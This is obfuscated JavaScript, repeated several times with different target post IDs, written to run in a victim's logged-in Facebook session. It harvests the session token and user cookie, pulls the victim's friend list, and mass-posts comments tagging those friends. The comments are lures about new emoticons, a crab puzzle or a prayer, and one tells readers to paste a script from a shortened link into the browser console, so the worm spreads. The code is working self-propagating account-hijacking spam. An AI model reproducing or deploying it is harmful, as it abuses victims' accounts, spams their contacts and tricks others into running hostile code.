_0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","278044245696309","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","456836191114599","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","402422216568254","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Encontre o Carangueijo :D :D :D :D :D :D :D :D :D Achou o Carangueijo? :D :D :D :D :D :D :D :D Marque e Comente.. :D :D :D :D :D :D :D :D  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","406524929491316","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Oração para Meus Amigos ^_^ Curta, Compartilhe, Comente ou Marque Todos.. Use Google Chrome, aperte F12 e na guia console cole o script do link http://goo.gl/yTsTJ5 e de enter  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
// JavaScript Document